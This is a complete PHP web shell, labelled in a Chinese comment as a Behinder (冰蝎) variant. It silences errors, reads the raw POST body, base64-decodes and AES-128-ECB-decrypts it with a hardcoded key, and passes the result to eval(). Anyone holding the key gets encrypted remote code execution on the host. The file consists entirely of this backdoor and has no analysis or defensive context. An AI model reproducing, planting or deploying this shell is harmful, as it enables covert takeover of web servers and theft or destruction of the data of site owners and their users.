<?php
// 冰蝎 PHP 变体：AES 解密 POST 体后 eval
session_start();
@set_time_limit(0);
@error_reporting(0);
function E($D, $K) {
    for ($i = 0; $i < strlen($D); $i++) {
        $D[$i] = $D[$i] ^ $K[$i + 1 & 15];
    }
    return $D;
}
function Q($D) {
    return base64_encode($D);
}
function O($D) {
    return openssl_decrypt($D, 'aes-128-ecb', 'e45e329feb5d925b', OPENSSL_RAW_DATA);
}
$payload = file_get_contents("php://input");
$decoded = O(base64_decode($payload));
eval($decoded);
?>
